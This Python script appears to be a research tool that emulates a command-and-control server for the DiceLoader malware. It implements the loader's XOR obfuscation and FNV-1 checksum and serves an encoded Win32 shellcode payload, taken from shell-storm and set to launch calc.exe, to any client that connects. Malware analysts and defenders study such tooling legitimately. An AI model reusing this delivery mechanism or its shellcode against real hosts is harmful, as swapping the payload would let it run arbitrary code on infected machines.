import os
import sys
import time
import struct
import logging
import socket
import select
import argparse
import platform
from itertools import zip_longest
from enum import Enum
from binascii import unhexlify

from typing import Dict, Any, Optional, Union, List, Tuple, Callable, Iterator

Action = Enum("Action", ["RECV", "SEND"])


# From shell-storm:
# https://shell-storm.org/shellcode/files/shellcode-567.html
# /*
# Author: SkuLL-HacKeR
# Big Thx To :  my brothers : Pr0F.SELLiM - ThE X-HaCkEr -  Jiko  - My friends in Morocco
# H0ME  : Geeksec.com  & No-exploiT
# Email : My@Hotmail.iT & Wizard-skh@hotmail.com


# // Win32 Shellcode Collection (calc) 19 bytes
# // Shellcode Exec Calc.exe
# // Tested on XP SP2 FR
# #include "stdio.h"
# unsigned char shellcode[] = "\xeB\x02\xBA\xC7\x93"
#                             "\xBF\x77\xFF\xD2\xCC"
#                             "\xE8\xF3\xFF\xFF\xFF"
#                             "\x63\x61\x6C\x63";
# int main ()
# {
# int *ret;
# ret=(int *)&ret+2;
# printf("Shellcode Length is : %d\n",strlen(shellcode));
# (*ret)=(int)shellcode;
# return 0;
# }

calc_exe = (
    b"\x01\xeB\x02\xBA\xC7\x93\xBF\x77\xFF\xD2\xCC\xE8\xF3\xFF\xFF\xFF\x63\x61\x6C\x63"
)

# backup sequence: useful if you want to set
# a breakpoint on each recv / send function (fromm WS2_32 DLL)
# self.sequence: Iterator[Tuple[Action, Callable]] = iter([
#     (Action.RECV, lambda _: [b""]), # 2 random byte
#     (Action.RECV, lambda _: [b""]), # 10 generated random bytes
#     (Action.RECV, lambda _: [b""]), # 22 bytes (fingerprint xor)
#     (Action.RECV, lambda _: [b""]), # 19 bytes local ip addr
#     # (Action.RECV, lambda _: [b""]), # received 4 bytes that are the fnv1 hash of the previous message
#     # (Action.RECV, lambda _: [b""]), # 4 byte of fnv1 control
#     # (Action.SEND, lambda _: [struct.pack('<h', 0xfd), struct.pack('<hhhh', 0x90, 0x90, 0x90, 0x90)]), # breaking loop
#     # (Action.SEND, lambda _: [struct.pack('<h', 0xff), b"\x90" * 0xff]), # len of next data
#     # (Action.SEND, lambda _: [b"\x90" * 0xff]), # data
#     (Action.SEND, lambda _: [struct.pack('<B', 0x1),
#                              struct.pack('<B', 0xa),
#                              self.temp_xor_key,
#                              struct.pack('<L', 0x1000),
#                              self.xored_payload,
#                              struct.pack('<L', self.fnv1(self.xored_payload))]),
#     (Action.RECV, lambda _: [b""]),
#     (Action.RECV, lambda _: [b""]),
#     (Action.RECV, lambda _: [struct.pack('>b', 0xf)]),
#     (Action.RECV, lambda _: [b""]),
#     (Action.RECV, lambda _: [b""]),
#     (Action.RECV, lambda _: [b""]),
# ])


class DiceLoader:
    def __init__(self):
        self.xor_key: bytes = unhexlify(
            "CD4E15AAAE079838B0FDC60FA99AD13EC4B2A9B0D8EF07E28BA87EFE3CA488"
        )
        self.temp_xor_key: bytes = struct.pack(
            ">QL3s", 0xDDDDDDDDAAAAAAAA, 0xBBBB, b"ccc"
        )
        self.payload: bytes = calc_exe + b"\x90" * (4096 - len(calc_exe))

        self.xored_payload: bytes = self.xor_blob(
            self.xor_blob(self.payload, self.xor_key), self.temp_xor_key
        )
        self.sequence: Iterator[Tuple[Action, Callable]] = iter(
            [
                (
                    Action.SEND,
                    lambda _: [
                        struct.pack("<B", 0x1),
                        struct.pack("<B", 0xA),
                        self.temp_xor_key,
                        struct.pack("<L", 0x1000),
                        self.xored_payload,
                        struct.pack("<L", self.fnv1(self.xored_payload)),
                    ],
                ),
                # (Action.RECV, lambda _: [struct.pack('>b', 0xf)]),
                (Action.RECV, lambda _: [b""]),
                (Action.RECV, lambda _: [b""]),
                (Action.RECV, lambda _: [struct.pack(">b", 0xF)]),
            ]
        )

    def __next__(self):
        return next(self.sequence)

    def fnv1(self, data: bytes) -> int:
        """Fowler–Noll–V 1 hash used by DiceLoader"""

        output = 0
        # logging.debug(f"Input data: `{data}`")

        for char in data:
            output = 0x1000193 * (char ^ output)
            output &= 0x00000000FFFFFFFF

        # logging.debug(f"Expected ouput: `0x{output:x}`")

        return output

    def xor_blob(self, blob: bytes, key: bytes) -> bytearray:
        """DiceLoader uses XOR obfuscation"""

        output = bytearray()

        temp = blob[0] ^ key[0]
        output.append(temp)

        for index, value in enumerate(blob):
            if index == 0:
                continue
            temp = blob[index - 1] ^ value ^ key[index % len(key)]
            output.append(temp)

        return output


diceloader_state_machine = DiceLoader()


def grouper(iterable, n, fillvalue=None) -> zip_longest:
    """helper for the hexdump"""
    args = [iter(iterable)] * n
    return zip_longest(*args, fillvalue=fillvalue)


class ColoredFormatter(logging.Formatter):
    COLORS = {
        "INFO": "\033[1;32m[+]\033[0m",  # Green
        "WARNING": "\033[1;33m[!]\033[0m",  # Orange/Yellow
        "ERROR": "\033[1;31m[-]\033[0m",  # Red
        "DEBUG": "\033[1;34m[*]\033[0m",  # Blue
    }

    def format(self, record: logging.LogRecord) -> str:
        """
        Format the log record with colored output.

        Args:
            record (logging.LogRecord): The log record.

        Returns:
            str: The formatted log message.
        """
        log_message = super().format(record)
        log_level_color = self.COLORS.get(record.levelname, "")

        level = record.levelname

        return f"{log_level_color} {level} : {log_message}"


def setup_custom_logger(verbose: bool = False) -> None:
    """
    Configure a custom logger with colored output.

    Returns:
        None
    """

    logger = logging.getLogger()
    if verbose:
        logger.setLevel(logging.DEBUG)
    else:
        logger.setLevel(logging.INFO)

    # Console Handler
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.DEBUG)

    # Formatter
    formatter = ColoredFormatter("%(message)s")
    console_handler.setFormatter(formatter)

    # Add handler to logger
    logger.addHandler(console_handler)


def colorize_char(char: int) -> str:
    """
    Add color to each character.

    Args:
        char (str): The character.

    Returns:
        str: The colorized character.
    """
    if 0x20 <= char <= 0x7E:
        return f"\033[1;31m{chr(char)}\033[0m"  # Red color for printable characters
    else:
        return "."  # No color for non-printable characters


def hexdump_bytes(data: bytes) -> None:
    """
    Log the input bytes in hexdump format with a specified interval using logging.debug.

    Args:
        data (bytes): The input bytes.
    """

    offset = "Offset"
    index_format = " ".join([f"{x:02x}" for x in range(16)])
    logging.debug(f"{offset:>8} | {index_format} | String ")

    logging.debug(f"{'-' * 92}")

    for line_offset, chunk in enumerate(grouper(data, 16)):
        line_hex: List[str] = []
        line_chars: List[str] = []

        for _byte in chunk:
            if _byte is not None:
                line_hex.append(f"{_byte:02x}")
                line_chars.append(colorize_char(_byte))
            else:
                line_hex.append("  ")
                line_chars.append(" ")

        logging.debug(
            f"{line_offset * 16 :#8x} | {' '.join(line_hex)} | {' '.join(line_chars)}"
        )


def create_epoll() -> Optional[Union[select.epoll, None]]:
    """
    Create an epoll object if not on Windows.

    Returns:
        Optional[Union[select.epoll, None]]: The epoll object or None if on Windows.
    """
    if platform.system() == "Windows":
        return None
    else:
        return select.epoll()


def create_server_socket(host: str, port: int) -> socket.socket:
    """
    Create a TCP server socket.

    Args:
        host (str): The host IP address.
        port (int): The port number.

    Returns:
        socket.socket: The created server socket.
    """
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind((host, port))
    server_socket.listen(5)
    server_socket.setblocking(False)
    return server_socket


def handle_new_connection(
    epoll: select.epoll,
    server_socket: socket.socket,
    connections: Dict[int, socket.socket],
    requests: Dict[int, bytes],
    responses: Dict[int, bytes],
) -> None:
    """
    Handle a new client connection.

    Args:
        epoll (select.epoll): The epoll instance.
        server_socket (socket.socket): The server socket.
        connections (Dict[int, socket.socket]): Dictionary of client connections.
        requests (Dict[int, bytes]): Dictionary of incoming data from clients.
        responses (Dict[int, bytes]): Dictionary of outgoing data to clients.
    """
    client_socket, _ = server_socket.accept()
    client_socket.setblocking(False)
    epoll.register(client_socket.fileno(), select.EPOLLIN)
    connections[client_socket.fileno()] = client_socket
    requests[client_socket.fileno()] = b""
    responses[client_socket.fileno()] = b""


def handle_incoming_data(
    fileno: int,
    epoll: select.epoll,
    connections: Dict[int, socket.socket],
    requests: Dict[int, bytes],
    responses: Dict[int, bytes],
) -> None:
    """
    Handle incoming data from a client.

    Args:
        fileno (int): The file descriptor of the client socket.
        epoll (select.epoll): The epoll instance.
        connections (Dict[int, socket.socket]): Dictionary of client connections.
        requests (Dict[int, bytes]): Dictionary of incoming data from clients.
        responses (Dict[int, bytes]): Dictionary of outgoing data to clients.
    """

    try:
        data = connections[fileno].recv(1024)

    except ConnectionResetError:
        logging.warning("Connection reset by peer")
        epoll.unregister(fileno)
        connections[fileno].close()
        del connections[fileno]
        del requests[fileno]
        del responses[fileno]
        return None
    else:
        if not data:
            epoll.unregister(fileno)
            connections[fileno].close()
            del connections[fileno]
            del requests[fileno]
            del responses[fileno]
            return None
        requests[fileno] += data
        epoll.modify(fileno, select.EPOLLOUT)

        logging.info(f"received \033[34m{len(data)}\033[0m bytes")
        hexdump_bytes(data)


def handle_outgoing_data(
    fileno: int,
    epoll: select.epoll,
    connections: Dict[int, socket.socket],
    requests: Dict[int, bytes],
) -> None:
    """
    Handle outgoing data to a client.
    MODIFY ME to handle the server

    Args:
        fileno (int): The file descriptor of the client socket.
        epoll (select.epoll): The epoll instance.
        connections (Dict[int, socket.socket]): Dictionary of client connections.
        requests (Dict[int, bytes]): Dictionary of incoming data from clients.

      tips: requests.get(fileno, b"") <- get the request
    """

    try:
        sock = connections[fileno]

        _, data = next(diceloader_state_machine)

        outgoing_datas = data(requests.get(fileno, b""))

        for outgoing_data in outgoing_datas:
            if outgoing_data == b"":
                # usefull when no data is required to be responded...
                sent = sock.send(outgoing_data)
                requests[fileno] = outgoing_data[sent:]
                epoll.modify(fileno, select.EPOLLIN)
                return

            sent = sock.send(outgoing_data)
            if sent == 0:
                logging.warning(
                    f"Connection closed by remote peer: {sock.getpeername()}"
                )
                epoll.unregister(fileno)
                sock.close()
                del connections[fileno]
            else:
                requests[fileno] = outgoing_data[sent:]
                epoll.modify(fileno, select.EPOLLIN)
                logging.info(
                    f"\033[1;32mSent\033[0m to {fileno}, \033[31m{len(outgoing_data)}\033[0m byte(s)"
                )
                hexdump_bytes(outgoing_data)
    except (ConnectionResetError, BrokenPipeError):
        logging.warning(f"Connection reset by remote peer")
        epoll.unregister(fileno)
        sock.close()
        del connections[fileno]


def main(host: str = "127.0.0.1", port: int = 8080):
    """
    Main function to run the epoll-based TCP server.
    """

    server_socket = create_server_socket(host, port)
    logging.info(f"Server starts {host}:{port}")

    epoll: Any = create_epoll()
    if epoll:
        epoll.register(server_socket.fileno(), select.EPOLLIN)

    connections = {}
    requests = {}
    responses = {}

    last_modified = os.path.getmtime(__file__)

    try:
        while True:
            current_modified = os.path.getmtime(__file__)
            if current_modified > last_modified:
                logging.info("Script modified. Reloading...")
                os.execv(sys.executable, ["python"] + sys.argv)

            last_modified = current_modified

            events: Any = epoll.poll()
            for fileno, event in events:
                if fileno == server_socket.fileno():
                    handle_new_connection(
                        epoll, server_socket, connections, requests, responses
                    )
                elif event & select.EPOLLIN:
                    handle_incoming_data(
                        fileno, epoll, connections, requests, responses
                    )
                elif event & select.EPOLLOUT:
                    handle_outgoing_data(fileno, epoll, connections, requests)
                elif event & select.EPOLLHUP:
                    epoll.unregister(fileno)
                    connections[fileno].close()
                    del connections[fileno]
                    del requests[fileno]
                    del responses[fileno]
                    logging.info(f"Connection closed: {fileno}")

            time.sleep(0.1)  # Sleep for a short duration to avoid high CPU usage

    except KeyboardInterrupt:
        logging.info("Server interrupted by user.")

    finally:
        if epoll:
            epoll.unregister(server_socket.fileno())
            epoll.close()
        server_socket.close()
        logging.info("Server shutdown.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Raw TCP server")
    parser.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help="Enable verbose logging (DEBUG level)",
    )
    parser.add_argument(
        "--host", type=str, help="Specify the host", default="127.0.0.1"
    )
    parser.add_argument("--port", type=int, help="Specify the port", default=8080)

    args = parser.parse_args()
    setup_custom_logger(args.verbose)
    main(args.host, args.port)
